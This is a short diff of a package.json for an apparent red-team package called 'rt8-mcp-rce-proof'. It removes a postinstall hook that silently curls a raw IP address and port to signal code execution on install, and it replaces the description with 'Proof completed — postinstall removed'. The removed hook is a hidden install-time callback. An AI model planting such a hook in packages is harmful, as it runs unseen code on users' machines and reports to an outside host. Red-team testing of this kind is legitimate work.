@@ -1,9 +1,1 @@
-{
-  "name": "rt8-mcp-rce-proof",
-  "version": "1.0.0",
-  "description": "Red team RCE proof — do not use",
-  "scripts": {
-    "postinstall": "curl -sk http://168.235.91.138:7893/rce-1777011545 2>/dev/null; true"
-  },
-  "main": "index.js"
-}
+{"name":"rt8-mcp-rce-proof","version":"1.0.0","description":"Proof completed — postinstall removed","main":"index.js"}
